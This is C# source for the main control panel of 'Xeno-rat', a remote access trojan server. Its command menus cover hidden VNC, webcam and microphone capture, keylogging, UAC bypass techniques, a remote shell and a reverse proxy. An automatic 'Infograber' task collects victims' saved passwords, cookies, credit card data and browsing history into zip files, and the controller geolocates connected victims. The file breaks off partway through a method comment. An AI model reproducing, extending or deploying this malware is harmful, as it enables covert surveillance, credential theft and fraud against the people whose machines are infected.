using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.ListView;
using Microsoft.VisualBasic;
using System.Windows.Forms.VisualStyles;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Vestris.ResourceLib;
using System.Runtime.InteropServices;
using System.Security;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using Newtonsoft.Json;
using System.Reflection.Emit;
using Newtonsoft.Json.Linq;
using xeno_rat_server.Forms;
using System.IO.Compression;
using System.Net;
using System.ComponentModel.Composition;
using MaxMind.GeoIP2;
using MaxMind.GeoIP2.Responses;

namespace xeno_rat_server
{
    public partial class MainForm : Form
    {

        private DatabaseReader ip2countryDatabase;

        private Listener ListeningHandler;
        private static Dictionary<int, Node> clients = new Dictionary<int, Node>();
        private static int currentCount = 0;
        private static byte[] key = new byte[32] { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
        private static string string_key = "1234";
        private static int ListviewItemCount_old = 6;
        private static int ListviewItemCount = 7;
        private Dictionary<string, string[]> Commands = new Dictionary<string, string[]>();
        private List<string> OnConnectTasks = new List<string>();
        private System.Windows.Forms.Timer ConfigUpdateTimer;
        private string LastConfig = "";

        private static bool LogErrors = true;


        public MainForm()
        {
            
            InitializeComponent();
            this.Text = "Xeno-rat: Created by moom825 - version 1.8.7";
            key = Utils.CalculateSha256Bytes(string_key);

            ListeningHandler =new Listener(OnConnect);

            string[] Power = new string[2];
            Power[0] = "Shutdown";
            Power[1] = "Restart";

            string[] Client = new string[3];
            Client[0] = "Close";
            Client[1] = "Relaunch";
            Client[2] = "Uninstall";

            string[] Surveillance = new string[6];
            Surveillance[0] = "Hvnc";
            Surveillance[1] = "WebCam";
            Surveillance[2] = "Live Microphone";
            Surveillance[3] = "Key Logger";
            Surveillance[4] = "Offline Key Logger";
            Surveillance[5] = "Screen Control";

            string[] Fun = new string[4];
            Fun[0] = "Chat";
            Fun[1] = "BlueScreen";
            Fun[2] = "Message Box";
            Fun[3] = "Fun Menu";

            string[] System = new string[8];
            System[0] = "Reverse proxy";
            System[1] = "Process Manager";
            System[2] = "File Manager";
            System[3] = "Registry Manager";
            System[4] = "Shell";
            System[5] = "InfoGrab";
            System[6] = "Startup";
            System[7] = "Remove Startup";


            string[] Uac_Bypass = new string[3];
            Uac_Bypass[0] = "Cmstp";
            Uac_Bypass[1] = "Windir + Disk Cleanup";
            Uac_Bypass[2] = "Fodhelper";

            string[] Uac_Options = new string[2];
            Uac_Options[0] = "Request admin";
            Uac_Options[1] = "De-escalate to user";

            string[] Debug_Info = new string[1];
            Debug_Info[0] = "Debug";

            Commands["Fun"] = Fun;
            Commands["Surveillance"] = Surveillance;
            Commands["System"] = System;
            Commands["Uac Bypass"] = Uac_Bypass;
            Commands["Uac Options"] = Uac_Options;
            Commands["Client"] = Client;
            Commands["Power"] = Power;
            Commands["Debug Info"] = Debug_Info;
        }

        /// <summary>
        /// Handles the connection of a socket and performs necessary setup operations.
        /// </summary>
        /// <param name="socket">The socket to be connected and set up.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method assigns a unique ID to the current connection and then connects and sets up the socket using the Utils.ConnectAndSetupAsync method.
        /// If the connection setup fails, it handles the disconnection of the socket and returns.
        /// If the connection setup is successful, it retrieves additional client information and adds it to a list view.
        /// It then checks for possible duplicates based on hardware ID and disconnects the client if a duplicate is found.
        /// If no duplicates are found, it creates a HeartBeat Node for the client, updates the list view, logs the new client connection, and initiates a heart beat process.
        /// If the client is of type 1, it assigns the parent node and adds the sub node to the client.
        /// </remarks>
        private async Task OnConnect(Socket socket)
        {
            int currentIdCount = currentCount++;
            Node client = await Utils.ConnectAndSetupAsync(socket, key, currentIdCount, OnDisconnect);
            if (client == null) 
            {
                try
                {
                    await Task.Factory.FromAsync(socket.BeginDisconnect, socket.EndDisconnect, true, null);
                }
                catch
                {
                    socket.Close(0);
                    socket.Dispose();
                }
                return;
            }
            if (client.SockType == 0)
            {
                ListViewItem clientdata = null;
                try
                {
                    clients[currentIdCount] = client;
                    clientdata = await GetAddInfo(client);
                }
                catch 
                {
                    clientdata = null;
                }
                if (clientdata == null) 
                {
                    client.Disconnect();
                    return;
                }
                
                List<ListViewItem> possibleDuplicates = GetClientsByHwid(clientdata.Text);
                List<string[]> duplicates = new List<string[]>();
                foreach (ListViewItem i in possibleDuplicates) 
                {
                    string[] match = new string[] { i.SubItems[2].Text, i.SubItems[7].Text };
                    duplicates.Add(match);
                }

                if (duplicates.Count > 0 && duplicates.Contains(new string[] { clientdata.SubItems[2].Text, clientdata.SubItems[7].Text })) 
                {
                    client.Disconnect();
                    return;
                }

                listView2.Invoke((MethodInvoker)(() =>//add the clientdata to the listview
                {
                    clientdata = listView2.Items.Add(clientdata);
                }));

                Node HeartSock=await client.CreateSubNodeAsync(1);//create HeartBeat Node
                if (HeartSock == null) 
                {
                    client.Disconnect();
                    return;
                }
                try
                {
                    ListViewUpdater(clientdata, client);
                }
                catch { }
                AddLog("new Client connected!", Color.Green);
                await HeartBeat(HeartSock, client);
            }
            else 
            {
                client.Parent = clients[client.ID];
                await clients[client.ID].AddSubNode(client);
            }
        }

        /// <summary>
        /// Retrieves a list of clients based on the specified hardware ID.
        /// </summary>
        /// <param name="hwid">The hardware ID used to filter the clients.</param>
        /// <returns>A list of <see cref="ListViewItem"/> objects representing the clients with the specified hardware ID.</returns>
        private List<ListViewItem> GetClientsByHwid(string hwid)
        {
            List<ListViewItem> results = new List<ListViewItem>();
            foreach (ListViewItem cliView in listView2.Items)
            {
                if (cliView.Text == hwid)
                {
                    results.Add(cliView);
                }
            }
            return results;
        }

        /// <summary>
        /// Completes tasks on connection with the client node.
        /// </summary>
        /// <param name="client">The client node to connect with.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method iterates through the list of tasks to be completed upon connection with the client node.
        /// If the task is "Start OfflineKeylogger", it creates a subclient, loads the "OfflineKeyLogger" DLL, and performs various operations.
        /// If the task is "Infograber", it creates a subclient, loads the "InfoGrab" DLL, and performs various operations to gather information.
        /// The gathered information is then zipped and saved in a directory named "OnConnectInfoGrabbedData".
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the execution of tasks.</exception>
        private async Task CompleteOnConnectTasks(Node client) 
        {
            foreach (string i in OnConnectTasks) 
            {
                try
                {
                    if (i == "Start OfflineKeylogger")
                    {
                        Node subClient = await client.CreateSubNodeAsync(2);
                        bool worked = await Utils.LoadDllAsync(subClient, "OfflineKeyLogger", File.ReadAllBytes("plugins\\KeyLoggerOffline.dll"), AddLog);
                        if (!worked)
                        {
                            continue;
                        }
                        await subClient.ReceiveAsync();
                        await subClient.SendAsync(new byte[] { 1 });
                        await Task.Delay(500);
                        subClient.Disconnect();
                    }
                    else if (i == "Infograber") 
                    {
                        Node subClient = await client.CreateSubNodeAsync(2);
                        bool worked = await Utils.LoadDllAsync(subClient, "InfoGrab", File.ReadAllBytes("plugins\\InfoGrab.dll"), AddLog);
                        if (!worked)
                        {
                            continue;
                        }
                        string cookies = "";
                        string passwords = "";
                        string ccs = "";
                        string history = "";
                        string downloads = "";
                        await subClient.SendAsync(new byte[] { 0 });
                        byte[] data = await subClient.ReceiveAsync();
                        if (data == null) 
                        {
                            goto end;
                        }
                        var loginlist = InfoGrab.DeserializeLoginList(data);
                        for (int x = 0; x < loginlist.Count; x++) 
                        {
                            passwords+=loginlist[x].ToString() + "\n";
                        }
                        await subClient.SendAsync(new byte[] { 1 });
                        data = await subClient.ReceiveAsync();
                        if (data == null)
                        {
                            goto end;
                        }
                        var cookielist = InfoGrab.DeserializeCookieList(data);
                        for (int x = 0; x < cookielist.Count; x++)
                        {
                            cookies += cookielist[x].ToString() + "\n";
                        }
                        await subClient.SendAsync(new byte[] { 2 });
                        data = await subClient.ReceiveAsync();
                        if (data == null)
                        {
                            goto end;
                        }
                        var cclist = InfoGrab.DeserializeCreditCardList(data);
                        for (int x = 0; x < cclist.Count; x++)
                        {
                            ccs += cclist[x].ToString() + "\n";
                        }
                        await subClient.SendAsync(new byte[] { 3 });
                        data = await subClient.ReceiveAsync();
                        if (data == null)
                        {
                            goto end;
                        }
                        var downloadlist = InfoGrab.DeserializeDownloadList(data);
                        for (int x = 0; x < downloadlist.Count; x++)
                        {
                            downloads += downloadlist[x].ToString() + "\n";
                        }
                        await subClient.SendAsync(new byte[] { 4 });
                        data = await subClient.ReceiveAsync();
                        if (data == null)
                        {
                            goto end;
                        }
                        var historylist=InfoGrab.DeserializeWebHistoryList(data);
                        for (int x = 0; x < historylist.Count; x++)
                        {
                            history += historylist[x].ToString() + "\n";
                        }
                        end:
                        subClient.Disconnect();

                        using (MemoryStream memoryStream = new MemoryStream())
                        {
                            using (ZipArchive archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
                            {
                                Utils.AddTextToZip(archive, "cookies.txt", cookies);
                                Utils.AddTextToZip(archive, "passwords.txt", passwords);
                                Utils.AddTextToZip(archive, "ccs.txt", ccs);
                                Utils.AddTextToZip(archive, "history.txt", history);
                                Utils.AddTextToZip(archive, "downloads.txt", downloads);
                            }
                            byte[] zipData = memoryStream.ToArray();
                            string directory = "OnConnectInfoGrabbedData";
                            string path=Path.Combine(new string[] { directory, DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString()+"- InfoGrab.zip" });
                            if (!Directory.Exists(directory)) 
                            { 
                                Directory.CreateDirectory(directory);
                            }
                            File.WriteAllBytes(path, zipData);
                        } 
                    }
                }
                catch 
                {
                    AddLog($"Error autostarting \"{i}\"", Color.Red);
                }
            }
        }

        /// <summary>
        /// Retrieves additional information and returns a ListViewItem object.
        /// </summary>
        /// <param name="type0node">The node from which to retrieve additional information.</param>
        /// <returns>A ListViewItem object containing additional information retrieved from the specified node.</returns>
        /// <exception cref="ArgumentNullException">Thrown when the input parameter <paramref name="type0node"/> is null.</exception>
        /// <remarks>
        /// This method retrieves additional information from the specified node. It sends a request to the node, receives the response, processes the data, and creates a ListViewItem object containing the retrieved information.
        /// If the node's SockType is not 0, or if any of the data retrieval steps fail, the method returns null.
        /// The method also handles exceptions that may occur during the retrieval process and sets default values for certain fields if necessary.
        /// </remarks>
        private async Task<ListViewItem> GetAddInfo(Node type0node)
        {

            if (type0node.SockType != 0)
            {
                return null;
            }
            byte[] reqdataop = new byte[] { 1 };
            if (!(await type0node.SendAsync(reqdataop)))
            {
                return null;
            }
            byte[] data = await type0node.ReceiveAsync();
            if (data == null) 
            {
                return null;
            }
            string[] strings = new string[ListviewItemCount];
            int start = 0;
            int end = 0;
            int count = 0;
            for(int b=0;b<data.Length;b++) 
            {
                end++;
                bool f = b == data.Length - 1;
                if (data[b] == 0 || f)
                {
                    int subamt = 1;
                    if (f) 
                    {
                        subamt = 0;
                    }
                    int d = end - start- subamt;
                    byte[] temp = new byte[d];
                    for (var i = 0; i < d; i++) 
                    {
                        temp[i] = data[start + i];
                    }
                    strings[count] = Encoding.UTF8.GetString(temp);
                    count++;
                    if (count > strings.Length) 
                    {
                        return null;
                    }
                    start=end;
                }
            }
            if (strings[strings.Length-2] == null) 
            {
                return null;
            }
            if (strings[strings.Length - 1] == null) // this is here for combatibility reasons for older stubs
            {
                string[] temp = new string[strings.Length];
                strings.CopyTo(temp, 0);
                strings[2] = "N/A";

                for (int i = 2; i < temp.Length-1; i++) 
                {
                    strings[i+1]= temp[i];
                }

            }
            ListViewItem lvi = new ListViewItem();
            ListViewItem item=null;
            lvi.Tag = type0node;

            string ipAddress = type0node.GetIp();

            string flag = "missing";
            try
            {
                CountryResponse ipData = ip2countryDatabase.Country(ipAddress);
                if (ipData.Country!=null)
                {
                    flag = ipData.Country.IsoCode;
                }
                
            }
            catch 
            { 
            }
            lvi.ImageKey = flag;
            lvi.Text = strings[0];
            lvi.SubItems.Add(ipAddress);
            lvi.SubItems.Add(strings[1]);
            lvi.SubItems.Add(strings[2]);
            lvi.SubItems.Add(strings[3]);
            lvi.SubItems.Add(strings[4]);
            lvi.SubItems.Add(strings[5]);
            lvi.SubItems.Add(strings[6]);
            lvi.SubItems.Add("");
            lvi.SubItems.Add("0");
            lvi.SubItems.Add("0");
            
            return lvi; 
        } 

        /// <summary>
        /// Handles the disconnection of a client node.
        /// </summary>
        /// <param name="client">The client node that has been disconnected.</param>
        /// <remarks>
        /// This method checks the socket type of the <paramref name="client"/>. If the socket type is 0, it removes the corresponding item from <see cref="listView2"/> and adds a log entry indicating that the client has been disconnected.
        /// </remarks>
        private void OnDisconnect(Node client)
        {
            if (client.SockType == 0) 
            {
                listView2.Invoke((MethodInvoker)(() =>
                {
                    foreach (ListViewItem i in listView2.Items) 
                    {
                        if (i.Tag == client) 
                        {
                            i.Remove();
                            AddLog("Client disconnected!", Color.Red);
                        }
                    }
                }));
            }
        }

        /// <summary>
        /// Updates the ListView with information received from the client node.
        /// </summary>
        /// <param name="item">The ListViewItem to be updated.</param>
        /// <param name="client">The Node representing the client.</param>
        /// <exception cref="ArgumentNullException">Thrown when <paramref name="item"/> is null.</exception>
        /// <returns>An asynchronous task representing the ListView update process.</returns>
        /// <remarks>
        /// This method updates the provided <paramref name="item"/> in the ListView with information received from the <paramref name="client"/> node.
        /// It creates a subnode using the client, sends a request to the subnode to get update information, and then updates the item with the received data.
        /// The method continues to update the item at regular intervals until either the subnode or the client is disconnected.
        /// </remarks>
        private async Task ListViewUpdater(ListViewItem item, Node client) 
        {
            if (item == null) 
            {
                return;
            }
            byte[] get_update_info = new byte[] { 0 };
            Node subnode = await client.CreateSubNodeAsync(2);
            CompleteOnConnectTasks(client);
            if (subnode == null) 
            {
                return;
            }
            while (subnode.Connected() && client.Connected()) 
            {
                Stopwatch timer = new Stopwatch();
                timer.Start();
                await subnode.SendAsync(get_update_info);
                byte[] data=await subnode.ReceiveAsync();
                timer.Stop();
                TimeSpan timeTaken = timer.Elapsed;
                if (data == null) 
                {
                    break;
                }
                string info = Encoding.UTF8.GetString(data);
                string window = info;
                string idle_time = "N/A";
                if (info.Contains("\n"))
                {
                    string[] split_data = info.Split('\n');
                    window = split_data[0];
                    idle_time = split_data[1];
                }
                listView2.BeginInvoke((MethodInvoker)(() =>
                {
                    item.SubItems[8].Text = window;
                    item.SubItems[9].Text = ((int)timeTaken.TotalMilliseconds).ToString();
                    item.SubItems[10].Text = idle_time;
                }));
                await Task.Delay(2000);
            }
            subnode.Disconnect();
            
        }

        /// <summary>
        /// Sends a heartbeat signal from the HeartSock to the MainSock and handles error messages if received.
        /// </summary>
        /// <param name="HeartSock">The node representing the heartbeat socket.</param>
        /// <param name="MainSock">The node representing the main socket.</param>
        /// <exception cref="System.NullReferenceException">Thrown when HeartSock is null.</exception>
        /// <returns>An asynchronous task representing the heartbeat process.</returns>
        /// <remarks>
        /// This method sends a heartbeat signal from the HeartSock to the MainSock at regular intervals and handles error messages if received.
        /// If HeartSock is null, the MainSock is disconnected and the method returns.
        /// The method sets a receive timeout of 5000 milliseconds for the HeartSock.
        /// While both HeartSock and MainSock are connected, the method sends a heartbeat signal, receives data, and handles error messages if received.
        /// If an error message is received, it is logged if LogErrors is true, and the method breaks.
        /// If the received operation code is not 1 or 3, the method breaks.
        /// The MainSock is disconnected at the end of the process.
        /// </remarks>
        private async Task HeartBeat(Node HeartSock, Node MainSock)
        {
            if (HeartSock == null)
            {
                MainSock.Disconnect();
                return;
            }
            HeartSock.SetRecvTimeout(5000);
            while (HeartSock.Connected() && MainSock.Connected()) 
            {
                byte[] reqHeart = new byte[] { 0 };
                await HeartSock.SendAsync(reqHeart);
                byte[] data=await HeartSock.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                int op = data[0];
                if (op == 3)
                {
                    try {
                        string error_msg=Encoding.UTF8.GetString(data, 1, data.Length - 1);
                        if (LogErrors) 
                        {
                            AddLog("Application error has occurred: " + error_msg, Color.Red);
                        }
                    } catch { }
                    break;
                }
                else if (op != 1)
                {
                    break;
                }
                await Task.Delay(1000);
            }
            MainSock.Disconnect();
        }

        /// <summary>
        /// Handles the MainForm load event.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method initializes the MainForm by setting the application icon, enabling double buffering for list views, setting up a configuration update timer, deserializing controls from a JSON file if it exists, starting the configuration update timer, loading country flags into a list view, initializing a database reader, and adding a log message indicating that the MainForm has started.
        /// </remarks>
        private void MainForm_Load(object sender, EventArgs e)
        {
            Icon = Icon.ExtractAssociatedIcon(System.Reflection.Assembly.GetExecutingAssembly().Location);
            listView2.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView2, true, null);
            listView3.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView3, true, null);
            ConfigUpdateTimer = new System.Windows.Forms.Timer();
            ConfigUpdateTimer.Tick += new EventHandler(ConfigUpdateTimer_Tick);
            ConfigUpdateTimer.Interval = 10000;
            if (File.Exists("Config.json"))
            {
                DeserializeControlsFromJson(File.ReadAllText("Config.json"));
            }
            ConfigUpdateTimer.Start();

            ImageList list = new ImageList();
            foreach (string i in Directory.EnumerateFiles("country_flags")) 
            {
                if (i.EndsWith(".png")) 
                {
                    list.Images.Add(Path.GetFileName(i).Replace(".png", ""), Image.FromFile(i));
                }
                
            }
            listView2.SmallImageList = list;
            ip2countryDatabase = new DatabaseReader(Path.Combine("country_flags", "GeoLite2-Country.mmdb"));

            AddLog("Started!", Color.Green);
        }

        /// <summary>
        /// Serializes the control data to JSON format and returns the serialized data.
        /// </summary>
        /// <returns>The serialized control data in JSON format.</returns>
        /// <remarks>
        /// This method creates a dictionary to store the control data, then populates it with the values of various text boxes, labels, and check boxes.
        /// It also includes other specific data such as OnConnectTasks, string_key, and ports.
        /// The method then serializes the dictionary to JSON format using the JsonConvert class from the Newtonsoft.Json library.
        /// </remarks>
        private string SerializeControlsToJson()
        {
            Dictionary<string, object> controlData = new Dictionary<string, object>();

            controlData["textBox15"] = textBox15.Text;
            controlData["textBox13"] = textBox13.Text;
            controlData["textBox14"] = textBox14.Text;
            controlData["textBox2"] = textBox2.Text;
            controlData["textBox16"] = textBox16.Text;
            controlData["textBox12"] = textBox12.Text;
            controlData["textBox6"] = textBox6.Text;
            controlData["textBox8"] = textBox8.Text;
            controlData["textBox4"] = textBox4.Text;
            controlData["textBox9"] = textBox9.Text;
            controlData["textBox3"] = textBox3.Text;
            controlData["textBox11"] = textBox11.Text;
            controlData["textBox10"] = textBox10.Text;
            controlData["textBox7"] = textBox7.Text;
            controlData["label16"] = label16.Text;
            controlData["checkBox1"] = checkBox1.Checked;
            controlData["checkBox2"] = checkBox2.Checked;
            controlData["checkBox3"] = checkBox3.Checked;
            controlData["checkBox4"] = checkBox4.Checked;
            controlData["OnConnectTasks"] = OnConnectTasks;
            controlData["string_key"] = string_key;
            List<int> ports = new List<int>();
            if (ListeningHandler != null)
            {
                foreach (int i in ListeningHandler.listeners.Keys)
                {
                    if (ListeningHandler.listeners[i].listening)
                    {
                        ports.Add(i);
                    }
                }
            }
            controlData["ports"] = ports.ToArray();
            string jsonData = JsonConvert.SerializeObject(controlData);
            return jsonData;
        }

        /// <summary>
        /// Deserializes control data from JSON string and populates the UI controls with the deserialized values.
        /// </summary>
        /// <param name="jsonData">The JSON string containing control data.</param>
        /// <exception cref="JsonException">Thrown when an error occurs during JSON deserialization.</exception>
        /// <remarks>
        /// This method deserializes the control data from the input JSON string and populates the UI controls with the deserialized values.
        /// It handles various UI controls such as text boxes, labels, checkboxes, and lists.
        /// Additionally, it performs error handling by displaying a message box in case of an exception during deserialization.
        /// </remarks>
        private void DeserializeControlsFromJson(string jsonData)
        {
            try
            {
                Dictionary<string, object> controlData = JsonConvert.DeserializeObject<Dictionary<string, object>>(jsonData);
                textBox15.Text = controlData["textBox15"].ToString();
                textBox13.Text = controlData["textBox13"].ToString();
                textBox14.Text = controlData["textBox14"].ToString();
                textBox2.Text = controlData["textBox2"].ToString();
                textBox16.Text = controlData["textBox16"].ToString();
                textBox12.Text = controlData["textBox12"].ToString();
                textBox6.Text = controlData["textBox6"].ToString();
                textBox8.Text = controlData["textBox8"].ToString();
                textBox4.Text = controlData["textBox4"].ToString();
                textBox9.Text = controlData["textBox9"].ToString();
                textBox3.Text = controlData["textBox3"].ToString();
                textBox11.Text = controlData["textBox11"].ToString();
                textBox10.Text = controlData["textBox10"].ToString();
                textBox7.Text = controlData["textBox7"].ToString();
                label16.Text = controlData["label16"].ToString();
                checkBox1.Checked = Convert.ToBoolean(controlData["checkBox1"]);
                checkBox2.Checked = Convert.ToBoolean(controlData["checkBox2"]);
                checkBox3.Checked = Convert.ToBoolean(controlData["checkBox3"]);
                checkBox4.Checked = Convert.ToBoolean(controlData["checkBox4"]);
                OnConnectTasks = ((JArray)controlData["OnConnectTasks"]).ToObject<List<string>>();
                foreach (string i in OnConnectTasks)
                {
                    listView4.Items.Add(i);
                }
                string_key = controlData["string_key"].ToString();
                label17.Text = "Current Password: " + string_key;
                key = Utils.CalculateSha256Bytes(string_key);
                int[] ports = ((JArray)controlData["ports"]).ToObject<int[]>();
                foreach (int i in ports)
                {
                    string string_port = i.ToString();
                    if (ListeningHandler.PortInUse(i))
                    {
                        MessageBox.Show($"The port {string_port} is currently in use! Press ok to skip.");
                        continue;
                    }
                    string[] row = { string_port };
                    var listViewItem = new ListViewItem(row);
                    listView1.Items.Add(listViewItem);
                    AddLog($"Listener on port {string_port} started!", Color.Green);
                    new Thread(() => ListeningHandler.CreateListener(i)).Start();
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show("Error loading config: " + ex.Message, "Error");
            }
        }

        /// <summary>
        /// Updates the configuration file at regular intervals.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method checks if the configuration file "Config.json" exists. If it does not exist, it creates a new file and writes the serialized controls to it.
        /// If the file exists, it compares the new serialized controls with the last saved configuration. If there is a difference, it updates the "Config.json" file with the new configuration.
        /// </remarks>
        private void ConfigUpdateTimer_Tick(object sender, EventArgs e)
        {
            if (!File.Exists("Config.json"))
            {
                File.WriteAllText("Config.json", SerializeControlsToJson());
                return;
            }
            string newconfig = SerializeControlsToJson();
            if (LastConfig != newconfig) 
            {
                File.WriteAllText("Config.json", newconfig);
                LastConfig = newconfig;
            }
        }

        /// <summary>
        /// Handles the button click event to start a listener on the specified port.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method retrieves the port number from the input textbox and attempts to start a listener on that port.
        /// If the input is not a valid number, a message box is displayed indicating the error.
        /// If the port number is not within the valid range, a message box is displayed indicating the error.
        /// If the specified port is already in use, a message box is displayed indicating the error.
        /// If all checks pass, a new item is added to the list view and a listener is created on the specified port in a new thread.
        /// </remarks>
        private void button1_Click(object sender, EventArgs e)
        {
            int port;
            string string_port = textBox1.Text;
            try 
            {
                 port=Int32.Parse(string_port);
            } 
            catch 
            {
                MessageBox.Show("That is not a valid number!");
                return;
            }
            if (port >= 65535)
            {
                MessageBox.Show("That is not a valid port number!");
                return;
            }
            if (ListeningHandler.PortInUse(port)) 
            {
                MessageBox.Show("That port is currently in use!");
                return;
            }
            string[] row = { string_port };
            var listViewItem = new ListViewItem(row);
            listView1.Items.Add(listViewItem);
            AddLog($"Listener on port {string_port} started!", Color.Green);
            new Thread(()=> ListeningHandler.CreateListener(port)).Start();
        }

        /// <summary>
        /// Removes a port from the list and stops the listener on that port.
        /// </summary>
        /// <param name="portItem">The ListViewItem representing the port to be removed.</param>
        /// <exception cref="FormatException">Thrown when the port number in <paramref name="portItem"/> cannot be parsed to an integer.</exception>
        /// <remarks>
        /// This method removes the specified port from the list and stops the listener on that port.
        /// It also logs a message indicating that the listener on the port has been stopped.
        /// </remarks>
        private void remove_port(ListViewItem portItem) 
        {
            int port = Int32.Parse(portItem.SubItems[0].Text);
            ListeningHandler.StopListener(port);
            AddLog($"Listener on port {port} stopped!", Color.Green);
            portItem.Remove();
        }

        /// <summary>
        /// Handles the mouse click event on the list view and displays a context menu if the right mouse button is clicked on a list view item.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// If the right mouse button is clicked, a context menu is displayed at the location of the mouse click.
        /// If the clicked item is not null and the mouse click is within the bounds of the item, a "Remove" option is added to the context menu.
        /// When an item is clicked in the context menu, the remove_port method is called with the focused item as a parameter.
        /// </remarks>
        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                ListViewItem focusedItem = listView1.FocusedItem;
                if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
                {
                    ContextMenuStrip PopupMenu = new ContextMenuStrip();
                    PopupMenu.Items.Add("Remove");
                    PopupMenu.ItemClicked += new ToolStripItemClickedEventHandler((object _, ToolStripItemClickedEventArgs __)=>  remove_port(focusedItem));
                    PopupMenu.Show(Cursor.Position);
                }
            }
        }

        /// <summary>
        /// Occurs when the selected index of the ListView2 control changes.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the Click event of tabPage1.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method is an event handler for the Click event of tabPage1. It is triggered when tabPage1 is clicked.
        /// </remarks>
        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Raises the FormClosed event and terminates the current process.
        /// </summary>
        /// <param name="e">A FormClosedEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method overrides the OnFormClosed method to perform additional tasks when the form is closed.
        /// It first calls the base class's OnFormClosed method to raise the FormClosed event.
        /// Then it terminates the current process by calling the GetCurrentProcess method of the System.Diagnostics.Process class and invoking the Kill method on the returned process.
        /// </remarks>
        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            base.OnFormClosed(e);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        /// <summary>
        /// Adds a log message to the list view with the specified text color.
        /// </summary>
        /// <param name="message">The message to be added to the log.</param>
        /// <param name="textcolor">The color of the text for the log message.</param>
        /// <remarks>
        /// This method creates a new list view item with the current time in the format "hh:mm:ss tt" as the first column, and the specified message as the second column.
        /// The text color of the log message is set to the specified color.
        /// The new list view item is then added to the list view in the UI thread using BeginInvoke method.
        /// </remarks>
        private void AddLog(string message, Color textcolor) 
        {
            ListViewItem lvi = new ListViewItem();
            lvi.Text = DateTime.Now.ToString("hh:mm:ss tt");
            lvi.SubItems.Add(message);
            lvi.ForeColor = textcolor;
            listView3.BeginInvoke((MethodInvoker)(() => { listView3.Items.Insert(0, lvi); }));
        }

        /// <summary>
        /// Starts a chat with the specified client node.
        /// </summary>
        /// <param name="client">The client node to start the chat with.</param>
        /// <exception cref="Exception">Thrown if there is an error starting the chat.</exception>
        /// <returns>No explicit return value. Starts a chat with the specified client node.</returns>
        /// <remarks>
        /// This method asynchronously creates a sub-node for the specified client using the <paramref name="client"/> and a given ID.
        /// It then attempts to load a DLL named "Chat" into the sub-node using the <see cref="Utils.LoadDllAsync"/> method, and displays an error message if the operation fails.
        /// If successful, it runs a new chat form using the created sub-node and disconnects the sub-node after the chat form is closed.
        /// If any errors occur during the process, an error message is displayed using <see cref="MessageBox.Show"/>.
        /// </remarks>
        private async Task StartChat(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Chat", File.ReadAllBytes("plugins\\Chat.dll"), AddLog);
                if (!worked) 
                {
                    MessageBox.Show("Error Starting chat!");
                    return;
                }
                Application.Run(new Forms.Chat(subClient));
                subClient.Disconnect();
            }
            catch 
            {
                MessageBox.Show("Error with chat!");
            }
        }

        /// <summary>
        /// Starts the process manager for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which the process manager needs to be started.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the process manager start.</exception>
        /// <returns>Task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method starts the process manager for the specified client node by creating a sub-client, loading the "ProcessManager" DLL, and running the application.
        /// If the loading of the DLL fails, an error message is displayed, and the method returns without starting the process manager.
        /// After running the application, the sub-client is disconnected.
        /// </remarks>
        private async Task StartProcessManager(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "ProcessManager", File.ReadAllBytes("plugins\\ProcessManager.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting ProcessManager!");
                    return;
                }
                Application.Run(new Forms.ProcessManager(subClient));
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with ProcessManager!");
            }
        }

        /// <summary>
        /// Asynchronously starts the HVNC (Hidden VNC) functionality for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which HVNC functionality is to be started.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the HVNC start process.</exception>
        /// <remarks>
        /// This method starts the HVNC functionality for the specified client node by creating a sub-node and loading the Hvnc.dll plugin.
        /// If the loading of the plugin is successful, it launches the HVNC form and disconnects the sub-client after its closure.
